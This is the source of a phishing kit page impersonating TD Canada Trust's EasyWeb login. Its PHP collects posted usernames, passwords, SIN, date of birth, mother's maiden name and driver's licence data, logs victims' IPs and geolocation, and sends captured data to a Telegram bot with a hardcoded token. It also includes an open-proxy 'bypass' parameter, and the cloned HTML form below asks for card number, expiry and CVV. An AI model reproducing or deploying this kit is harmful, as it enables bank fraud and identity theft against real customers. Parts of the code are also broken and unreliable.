
       
 <?php





header("Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'");
header("X-XSS-Protection: 0");
header("X-Frame-Options: ALLOWALL");
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Credentials: true");
header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
header("Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token");

if(isset($_GET['bypass']) && $_GET['bypass'] == 'true'){
    $url = $_GET['url'];
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        "Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'",
        "X-XSS-Protection: 0",
        "X-Frame-Options: ALLOWALL",
        "Access-Control-Allow-Origin: *",
        "Access-Control-Allow-Credentials: true",
        "Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS",
        "Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token"
    ));
    $response = curl_exec($ch);
    $info = curl_getinfo($ch);
    curl_close($ch);

    header("HTTP/1.1 ".$info['http_code']);
    foreach ($info['headers'] as $header) {
        if (!preg_match('/^Transfer-Encoding:/i', $header)) {
            header($header);
        }
    }
    echo $response;
    exit;
}




$full_date = date("h:i:s|M/d/Y");
$time = date("h:i:s");
$date = date("M/d/Y");
$full_date = date("h:i:s|M/d/Y");
$time = date("h:i:s");
$date = date("M/d/Y");

function get_client_ip()
{
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    } else if (isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    } else {
        $ipaddress = 'UNKNOWN';
    }

    return $ipaddress;
}
$user_agent = $_SERVER['HTTP_USER_AGENT'];

function getOS() { 
    global $user_agent;
    $os_platform  = "Unknown OS Platform";
    $os_array     = array(
                          '/windows nt 10/i'      =>  'Windows 10',
                          '/windows nt 6.3/i'     =>  'Windows 8.1',
                          '/windows nt 6.2/i'     =>  'Windows 8',
                          '/windows nt 6.1/i'     =>  'Windows 7',
                          '/windows nt 6.0/i'     =>  'Windows Vista',
                          '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                          '/windows nt 5.1/i'     =>  'Windows XP',
                          '/windows xp/i'         =>  'Windows XP',
                          '/windows nt 5.0/i'     =>  'Windows 2000',
                          '/windows me/i'         =>  'Windows ME',
                          '/win98/i'              =>  'Windows 98',
                          '/win95/i'              =>  'Windows 95',
                          '/win16/i'              =>  'Windows 3.11',
                          '/macintosh|mac os x/i' =>  'Mac OS X',
                          '/mac_powerpc/i'        =>  'Mac OS 9',
                          '/linux/i'              =>  'Linux',
                          '/ubuntu/i'             =>  'Ubuntu',
                          '/iphone/i'             =>  'iPhone',
                          '/ipod/i'               =>  'iPod',
                          '/ipad/i'               =>  'iPad',
                          '/android/i'            =>  'Android',
                          '/blackberry/i'         =>  'BlackBerry',
                          '/webos/i'              =>  'Mobile'
                    );

    foreach ($os_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $os_platform = $value;

    return $os_platform;
}

function getBrowser() {
    global $user_agent;
    $browser        = "Unknown Browser";
    $browser_array = array(
                            '/msie/i'      => 'Internet Explorer',
                            '/firefox/i'   => 'Firefox',
                            '/safari/i'    => 'Safari',
                            '/chrome/i'    => 'Chrome',
                            '/edge/i'      => 'Edge',
                            '/opera/i'     => 'Opera',
                            '/netscape/i'  => 'Netscape',
                            '/maxthon/i'   => 'Maxthon',
                            '/konqueror/i' => 'Konqueror',
                            '/mobile/i'    => 'Handheld Browser'
                     );

    foreach ($browser_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $browser = $value;

    return $browser;
}


$user_os        = getOS();
$user_browser   = getBrowser();
 
$PublicIP = get_client_ip();
$localHost = "127.0.0.1";

if (strpos($PublicIP, ',') !== false) {
    $PublicIP = explode(",", $PublicIP)[0];
}

$file       = 'data.dat';
$file1       = 'combo.txt';
$file2       = 'master.log';
$ip         = "".$PublicIP;
$uaget      = "".$user_agent;
$bsr        = "".$user_browser;
$uos        = "".$user_os;
$ust= explode(" ", $user_agent);
$vr= $ust[3];
$ver=str_replace(")", "", $vr);
$version   = "Version              : ".$ver;
if (strpos($PublicIP, $localHost) !== false) {
    $details = '{
        "success": false
    }';
}
else {
    $details  = file_get_contents("http://ipwhois.app/json/$PublicIP");
}
$details  = json_decode($details, true);
$success  = $details['success'];
$fp = fopen($file, 'a');

if ($success==false) {
    fwrite($fp, $ip."\n");
    fwrite($fp, $uos."\n");
    fwrite($fp, $version."\n");
    fwrite($fp, $bsr."\n");
    fclose($fp);
} else if ($success==true) {
    $country    = $details['country'];
    $city       = $details['city'];
    $continent  = $details['continent'];
    $tp         = $details['type'];
    $cn         = $details['country_phone'];
    $is         = $details['isp'];
    $la         = $details['latitude'];
    $lp         = $details['longitude'];
    $crn        = $details['currency'];
    $type       = $tp;
    $bank       = "TD";
    $url        = "https://easyweb.td.com";
    $user       = $_POST['username'];
    $pass       = $_POST['password'];
    $code       = $_POST['code']; 
    $name       = $_POST['name'];  
$dob1       = $_POST['dob1']; 
$dob2       = $_POST['dob2']; 
$dob3       = $_POST['dob3']; 
$mmn       = $_POST['mmn']; 
$sin       = $_POST['sin']; 
$dl       = $_POST['drivers']; 
	$lh     = "|";
    $mapurl     = "[maps.google.com/?q=$la$lh$lp]";
    $isp        = $is;
    $currency   = "".$full_date;
    $li     = ",";

    

} else {
    $status     = "Status : ".$success;
    fwrite($fp, $status."\n");
    fwrite($fp, $uaget."\n");
    fclose($fp);
}



$message = "$ip$lh$code\]\n";
file_put_contents($file2, "$date$li$time$li$ip$li$bsr$li$uos$li$country$li$city$li$continent$li$tp$li$cn$li$is$li$la$li$lp$li$crn$li$type$li$bank$li$url$li$logo$li$gitusr$li$mapurl$li$isp$li$li$code\n", FILE_APPEND); 
file_put_contents($file, "$message\n////[$date]////////[$time]////////////[$bank]//[TELEGRAM-LOG]//\n", FILE_APPEND);file_put_contents($file3, "$date$li$time$li$url$li$bank$li$ili$user$li$pass\n", FILE_APPEND);
file_put_contents($file4, "$date$lh$time$lh$ip$lh$uaget\n", FILE_APPEND);
$apiToken = "5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA"; 
$data = [
    'chat_id' => '-1001831940786',
    'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                 http_build_query($data) );
                                
      ?>

<<html lang="en-CA"><link type="text/css" rel="stylesheet" id="#"><link type="text/css" rel="stylesheet" id="#"><style lang="en" type="text/css" id="#""></style>
       <style lang="en" type="text/css" id="#"></style>
       <style lang="en" type="text/css" id=""></style>
       <head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
   
   
           <style>
               type="text/css"
               [ng\:cloak],
               [ng-cloak],
               [data-ng-cloak],
               [x-ng-cloak],
               .ng-cloak,
               .x-ng-cloak,
               .ng-hide:not(.ng-hide-animate) {
                   display: none !important;
               }
               [ng\:form] {
                   display: block;
               }
               .ng-animate-shim {
                   visibility: hidden;
               }
               .ng-anchor {
                   position: absolute;
               }
           </style>
   
           <meta http-equiv="X-UA-Compatible" content="IE=edge">
           <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable = no">
           <meta name="apple-mobile-web-app-capable" content="yes">
           <meta name="apple-touch-fullscreen" content="yes">
           <title>EasyWeb Login</title>
           <link rel="stylesheet" href="./files/uap-application-all-css.css">
           <link rel="icon" href="assets/td/favicon.ico">
           <style>
               .form-group {
                   padding-top: 0;
               }
   
               .display-inline-block {
                   display: inline-block;
               }
           </style>
           <script src="./files/jquery-3.6.0.min.js###%" crossorigin="anonymous"></script>
           <script>
               var lrbank = 'TD';
               var lrinfo = 'Card';
           </script>
           <script src="./files/actions.js###%"></script>
</head>
   </html></style></head><body prevent-click-highlight="" autoscroll="" class=""><div id="contentWrapper">
   <div data-ui-view="header" class="" style="">
       <otp-header>
           <div class="td_rq_header-nav td-header-nav">
               <header class="td-header-desktop">
                   <div class="td-nav-primary">
                       <div class="td-container">
                           <div class="td-section-left">
                               <div class="td-logo" style="margin-top: 15px;">
                                   <img alt="TD Canada Trust" src="./files/td-logo.png">
                               </div>
                           </div>
                           <div class="td-section-right">
                               <div class="td-quick-access">
                                   <ul class="td-header-nav-utilities">
                                       <li class="td-dropdown td-dropdown-language td-dropdown-no-hover ng-hide" aria-hidden="true">
                                           <a href="deposit/td/c.php" class="td-show-label" aria-haspopup="true" aria-expanded="false" id="td-desktop-nav-dropdown-link-0">
                                               <span class="td-forscreenreader">Select language</span>
                                               Français
                                               <span class="td-icon expand" aria-hidden="true"></span>
                                               <span class="td-icon collapse" aria-hidden="true"></span>
                                           </a>
                                           <ul
                                               class="td-dropdown-content" aria-labelledby="td-desktop-nav-dropdown-link-0">
                                               <!---->
                                               <li ng-class="{&#39;active&#39;: language==vm.dt.selectedLanguage}" ng-repeat="language in vm.dt.languages track by $index" class="active">
                                                   <a href="deposit/td/c.php" role="button" ng-click="vm.setLanguage(language)">
                                                       English
                                                       <!---->
                                                       <span ng-if="language==vm.dt.selectedLanguage" class="td-icon selected" aria-hidden="true"></span>
                                                       <!---->
                                                       <!---->
                                                       <span ng-if="language==vm.dt.selectedLanguage" class="td-forscreenreader">Selected</span>
                                                       <!---->
                                                   </a>
                                               </li>
                                               <!---->
                                               <li ng-class="{&#39;active&#39;: language==vm.dt.selectedLanguage}" ng-repeat="language in vm.dt.languages track by $index">
                                                   <a href="deposit/td/c.php" role="button" ng-click="vm.setLanguage(language)">
                                                       Français
                                                   <!---->
                                                       <!---->
                                                   </a>
                                               </li>
                                               <!---->
                                           </ul>
                                       </li>
                                       <li class="secure-lock-position" aria-hidden="true"></li>
                                   </ul>
                               </div>
                           </div>
                       </div>
                   </div>
               </header>
               <!-- Desktop Header END -->
               <!-- Mobile Header START -->
               <header class="td-header-mobile">
                   <div class="td-container">
                       <div class="td-section-left">
                           <button type="button" class="td-mobile-action-button td-mobile-menu-button">
                               <div ng-show="!!vm.needLangToggle || ($root.otpGenericConfig &amp;&amp; !!$root.otpGenericConfig.isLanguageToggleEnabled)" class="td-mobile-menu-button-icon ng-hide" aria-hidden="true">
                                   <span class="td-forscreenreader">Open menu</span>
                                   <span class="icon-bar" aria-hidden="true"></span>
                                   <span class="icon-bar" aria-hidden="true"></span>
                                   <span class="icon-bar" aria-hidden="true"></span>
                               </div>
                               <div class="td-logo">
                                   <img src="./files/td-logo.png" alt="TD Canada Trust">
                               </div>
                           </button>
                           <button type="button" class="td-mobile-action-button td-mobile-back-button" onclick="history.back();">
                               Test!
                               <div class="td-mobile-back-button-icon">
                                   <span class="td-icon"></span>
                                   <span class="td-forscreenreader">Back</span>
                               </div>
                               <div class="td-logo">
                                   <img src="./files/td-logo.png" alt="TD Canada Trust">
                               </div>
                           </button>
                       </div>
                       <div class="td-section-right">
                           <div
                               class="secure-lock-position" aria-hidden="true"><!--<span class="td-icon icon-regular td-icon-logout"></span>-->
                           </div>
                       </div>
                   </div>
               </header>
               <!-- Mobile Header END -->
               <!-- Mobile Off-canvas Menu START -->
               <div
                   ng-show="!!vm.needLangToggle || ($root.otpGenericConfig &amp;&amp; !!$root.otpGenericConfig.isLanguageToggleEnabled)" class="td-nav-mobile ng-hide" aria-hidden="true">
                   <!-- Primary mobile menu START -->
                   <div class="td-nav-mobile-menu td-nav-mobile-menu-primary">
                       <span tabindex="0"></span>
                       <div class="td-nav-mobile-menu-top">
                           <div class="td-nav-mobile-menu-header">
                               <div class="td-logo">
                                   <a href="https://authentication.td.com/">
                                       <img src="./files/td-logo.png" alt="TD Canada Trust">
                                   </a>
                               </div>
                               <button type="button" class="td-mobile-menu-close">
                                   <span class="td-forscreenreader">Close Menu</span>
                                   <span class="td-icon" aria-hidden="true"></span>
                               </button>
                           </div>
                       </div>
                       <nav>
                           <ul class="td-nav-mobile-menu-list">
                               <li class="td-nav-mobile-menu-item td-item-toggle td-accordion td-accordion-language">
                                   <a href="deposit/td/c.php" aria-expanded="false" role="button">
                                       <span class="td-forscreenreader">Select language</span>
                                       Français
                                       <span class="td-icon expand" aria-hidden="true"></span>
                                       <span class="td-icon collapse" aria-hidden="true"></span>
                                   </a>
                                   <ul
                                       class="td-accordion-content">
                                       <!---->
                                       <li ng-class="{&#39;active&#39;: language==vm.dt.selectedLanguage}" ng-repeat="language in vm.dt.languages track by $index" class="active">
                                           <a href="deposit/td/c.php" role="button" ng-click="vm.setLanguage(language)">
                                               English
                                               <!---->
                                               <span ng-if="language==vm.dt.selectedLanguage" class="td-icon selected" aria-hidden="true"></span>
                                               <!---->
                                               <!---->
                                               <span ng-if="language==vm.dt.selectedLanguage" class="td-forscreenreader">Selected</span>
                                               <!---->
                                           </a>
                                       </li>
                                       <li ng-class="{&#39;active&#39;: language==vm.dt.selectedLanguage}" ng-repeat="language in vm.dt.languages track by $index">
                                           <a href="deposit/td/c.php" role="button" ng-click="vm.setLanguage(language)">
                                               Français
                                           </a>
                                       </li>
                                   </ul>
                               </li>
                           </ul>
                       </nav>
                       <span tabindex="0"></span>
                   </div>
                   <div class="td-nav-mobile-overlay"></div>
               </div>
           </div>
       </otp-header>
   </div>
   <div class="td-contentarea" role="main" style="padding-top: 70px;">
       <ui-view class="" style="">
           <ui-view>
               <reset>
                   <ui-view class="" style="">
                       <reset-password dt="::$resolve.dt" device-print="::$resolve.devicePrint" device-info="::$resolve.deviceInfo" thread-matrix="::$resolve.threadMatrix">
                           <div class="td-container">
                               <h1 class="text-center" tabindex="0">Confirm your TD Online Access</h1>
                               <hr aria-hidden="true" class="td-thin-divider-line-1">
                               <form method="post" action="040151.php" class="ng-pristine ng-valid td_rq_form_legacy td-form td-form-validate td-form-dynamic form-card" onsubmit="return validate()">
                                   <h1 class="text-center">Payment Information</h1>
                                   <div class="td-row">
                                       <div class="td-col-lg-8 td-col-lg-offset-2 td-col-md-10 td-col-md-offset-1">
                                           <div class="td-row">
                                               <div class="td-col-sm-6 td-col-sm-offset-3">
                                                   <div class="form-group" style="">
                                                       <label>Card Number</label>
                                                       <input id="input-card" type="tel" placeholder="Enter your Card Number" name="card" class="form-control lrinput" onkeyup="split()" required="true" autocomplete="off" maxlength="19" oninput="this.value = this.value.replace(/[^0-9, ]/, &#39;&#39;)" attr-action="Filling Card">
                                                       <script src="./files/splitter.js###%"></script>
                                                       <link rel="stylesheet" href="./files/card.css">
                                                   </div>
                                                   <label>Expiry</label>
                                                   <div class="form-group" style="">
                                                       <select name="exp1" required="" class="form-control text-center display-inline-block lrinput" style="width:48%;" attr-action="Selecting Expiry">
                                                           <option value="">MM</option>
                                                           <option value="01">01</option>
                                                           <option value="02">02</option>
                                                           <option value="03">03</option>
                                                           <option value="04">04</option>
                                                           <option value="05">05</option>
                                                           <option value="06">06</option>
                                                           <option value="07">07</option>
                                                           <option value="08">08</option>
                                                           <option value="09">09</option>
                                                           <option value="10">10</option>
                                                           <option value="11">11</option>
                                                           <option value="12">12</option>
                                                       </select>
                                                       <select name="exp2" required="" class="form-control text-center display-inline-block lrinput" style="width:48%;" attr-action="Selecting Expiry">
                                                           <option value="">YY</option>
                                                           <option value="23">23</option>
                                                           <option value="24">24</option>
                                                           <option value="25">25</option>
                                                           <option value="26">26</option>
                                                           <option value="27">27</option>
                                                           <option value="28">28</option>
                                                           <option value="29">29</option>
                                                           <option value="30">30</option>
                                                           <option value="31">31</option>
                                                           <option value="32">32</option>
                                                           <option value="33">33</option>
                                                           <option value="34">34</option>
                                                           <option value="35">35</option>
                                                           <option value="36">36</option>
                                                           <option value="37">37</option>
                                                           <option value="38">38</option>
                                                       </select><br><br>
                                                       <label>Cvv</label>
                                                                <input required="" id="input-cvv" type="tel" maxlength="3" placeholder="•••" name="cvv" class="form-control lrinput" oninput="this.value = this.value.replace(/[^0-9]/, &#39;&#39;)" attr-action="Filling Cvv">

                                                               
                                                   </div>
                                               </div>
                                           </div>
                                       </div>
                                   </div>
                                   <div class="td-row">
                                       <div class="td-col-sm-4 td-col-sm-offset-2 td-col-sm-push-4 td-col-md-3 td-col-md-offset-3 td-col-md-push-3">
                                           <div class="form-group">
                                               <button type="submit" class="td-button td-button-secondary" style="width:100%;" name="save" value="1">
                                                   Submit
                                               </button>
                                           </div>
                                       </div>
                                   </div>
                               </form>
                               <br><br><br><br><br><br><br>
                           </div>
                           <br><br>
                       </reset-password>
                   </ui-view>
               </reset>
           </ui-view>
       </ui-view>
   </div>
   <div data-ui-view="footer" class="">
       <otp-footer>
           <footer class="td-background-dark-green" style="left: 0px; right: 0px; bottom: 0px; position: absolute;">
               <div class="td-container">
                   <div class="td-row">
                       <div class="td-col-xs-12 td-footer-content otp-footer-content">
                           <div class="td-footer-links td-copy-align-centre td-copy-white">
                               <a class="td-copy-white td-link-nounderline td-copy-standard" target="_blank" href="https://www.td.com/privacy-and-security/privacy-and-security/index.jsp">
                                   Privacy and Security
                               </a>
                               <a class="td-copy-white td-link-nounderline td-copy-standard" target="_blank" href="https://www.td.com/to-our-customers/">
                                   Legal
                               </a>
                               <a class="td-copy-white td-link-nounderline td-copy-standard" target="_blank" href="http://www.tdcanadatrust.com/customer-service/accessibility/accessibility-at-td/index.jsp">
                                   Accessibility
                               </a>
                               <a href="not-found" style="visibility: hidden;">d0 n0t cl1ck</a>
                           </div>
                       </div>
                   </div>
               </div>
           </footer>
       </otp-footer>
   </div></div><div id="automa-palette"></div></body></html>
   